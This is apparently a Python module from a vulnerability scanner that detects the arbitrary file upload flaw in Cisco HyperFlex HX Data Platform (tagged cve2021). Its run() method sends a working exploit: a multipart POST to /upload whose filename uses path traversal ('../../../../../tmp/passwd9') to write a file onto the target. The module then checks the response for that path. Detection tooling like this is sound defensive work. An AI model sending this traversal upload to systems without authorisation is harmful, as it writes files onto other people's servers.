#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cisco HyperFlex HX Data Platform contains an arbitrary file upload vulnerability in the web-based management i."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cisco HyperFlex HX Data Platform - Arbitrary File Upload Detection',
        ...
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'fileupload', 'intrusive', 'packetstorm', 'cisco', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        path = '/upload'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'multipart/form-data; boundary=---------------------------253855577425106594691130420583', 'Origin': '{{RootURL}}', 'Referer': '{{RootURL}}'}, data='-----------------------------253855577425106594691130420583\nContent-Disposition: form-data; name="file"; filename="../../../../../tmp/passwd9"\nContent-Type: application/json\n\nMyPasswdNewData->/api/tomcat\n\n-----------------------------253855577425106594691130420583--\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('{"result":', '"filename:', '/tmp/passwd9',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Cisco HyperFlex HX Data Platform - Arbitrary File Upload detected', path=path)
            return True
        return False
